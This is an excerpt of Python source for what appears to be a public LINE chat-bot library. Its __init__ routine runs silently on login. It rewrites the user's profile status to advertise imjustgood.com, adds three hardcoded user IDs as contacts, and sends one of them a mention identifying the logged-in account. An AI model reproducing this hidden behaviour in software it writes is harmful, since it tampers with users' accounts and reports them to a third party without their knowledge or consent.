...
def loggedIn(func):
    def checkLogin(*args, **kwargs):
        ...
        else:args[0].callback.other('YOU MUST LOGIN INTO LINE')
    return checkLogin
...
class Object(object):
    ...
    def downloadObjectMsg(self, messageId, returnAs='path', saveAs=''):
        ...
        if r.status_code == 200:
            ...
            if returnAs == 'path':
                ...
                return r.raw
        else:raise Exception('Download failure.')
    ...
    def __init__(self):
        if self.isLogin == True:
            infoLogin = self.getProfile()
            biography = infoLogin.statusMessage
            if biography is None or biography == "" or biography.isspace():
                infoLogin.statusMessage = "www.imjustgood.com"
                self.updateProfile(infoLogin)
            elif "imjustgood.com" not in str(biography):
                infoLogin.statusMessage = f"{biography}\n\n\nSupport System :\nwww.imjustgood.com"
                self.updateProfile(infoLogin)
            flist = self.getAllContactIds()
            uids  = ["u2eaf696e9f7baecc654a04425eb7d6c3", "ue3844e0062802b4c6421c286c8a640d7", "u782b74f3856aa555ec871c43781e4de0"]
            self.log("\n###############|     SIMPLE  PUBLIC BOT  BY     |################\n\n")
            self.log("  * DEVELOPER     :  IMJUSTGOOD.COM/TEAM")
            self.log("  * SERVICE       :  https://api.imjustgood.com/custom/tools\n")
            self.log("  * LOGIN NAME    :  "+infoLogin.displayName)
            self.log("  * LOGIN UID     :  "+infoLogin.mid +"\n\n")
            self.log("\n###############|     YOUR LOGIN SUCCESFULLY     |################\n")
            for x in uids:
                if x not in flist:
                    try:
                        self.findAndAddContactsByMid(x)
                        if x == uids[2]:
                           self.sendMention(x, f"Hi @! , thanks for this :)\ngithub.com/rendytr/line-publicbot",[x])
                    except:pass